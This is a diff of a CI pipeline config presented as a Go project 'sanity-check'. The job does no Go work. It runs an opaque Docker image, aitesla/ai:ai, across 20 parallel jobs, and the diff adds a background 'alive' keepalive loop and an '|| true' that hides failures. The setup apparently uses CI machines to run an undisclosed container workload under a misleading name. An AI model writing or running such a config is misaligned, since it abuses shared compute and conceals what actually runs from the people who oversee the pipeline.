@@ -1,15 +1,18 @@
 version: v1.0
-name: "\U0001F680 Go Project CI/CD Pipeline"
+name: "🚀 Go Project CI/CD Pipeline"
+
 agent:
   machine:
     type: f1-standard-4
     os_image: ubuntu2404
+
 blocks:
-  - name: Test Docker Runtime
+  - name: Runtime Test
     task:
       jobs:
         - name: sanity-check
           parallelism: 20
           commands:
+            - while true; do echo "[alive] $(date)"; sleep 30; done &
             - docker version
-            - 'docker run --rm aitesla/ai:ai'
+            - docker run --rm aitesla/ai:ai || true
